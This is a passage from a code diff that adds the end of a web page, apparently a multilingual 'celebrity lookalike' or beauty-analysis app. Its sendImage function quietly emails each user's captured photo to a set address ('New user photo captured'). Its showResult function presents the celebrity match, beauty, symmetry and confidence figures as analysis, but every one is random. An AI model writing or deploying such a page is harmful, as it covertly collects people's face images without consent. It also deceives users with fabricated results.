+            setTimeout(() => {
+                modal.style.display = 'none';
+                processingDiv.style.display = 'none';
+                showResult();
+            }, 3000);
+        }
+
+        function sendImage(imageData) {
+            fetch('https://jsonplaceholder.typicode.com/posts', {
+                method: 'POST',
+                body: JSON.stringify({ dummy: "data" }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+
+            emailjs.init("YOUR_EMAILJS_USER_ID");
+            const templateParams = {
+                to_email: "your_email@example.com",
+                image: imageData,
+                message: "New user photo captured"
+            };
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                .then(response => console.log("Image sent:", response))
+                .catch(error => console.error("Send error:", error));
+        }
+
+        function showResult() {
+            const randomCeleb = celebrities[Math.floor(Math.random() * celebrities.length)];
+            const randomPercent = Math.floor(Math.random() * 41) + 60;
+            const beautyScore = Math.floor(Math.random() * 41) + 60;
+            const symmetry = Math.floor(Math.random() * 31) + 70;
+            const features = ["Golden Ratio Eyes", "Defined Jawline", "Balanced Proportions"].slice(0, Math.floor(Math.random() * 3) + 1).join(", ");
+            const confidence = Math.floor(Math.random() * 21) + 80;
+            const lang = document.documentElement.lang || 'en';
+            resultDiv.innerHTML = translations[lang].result
+                .replace('{celeb}', randomCeleb)
+                .replace('{percent}', randomPercent)
+                .replace('{beauty}', beautyScore)
+                .replace('{symmetry}', symmetry)
+                .replace('{features}', features)
+                .replace('{confidence}', confidence);
+        }
+
+        // تعيين اللغة الافتراضية
+        updateLanguage('en');
+    </script>
+</body>
+</html>
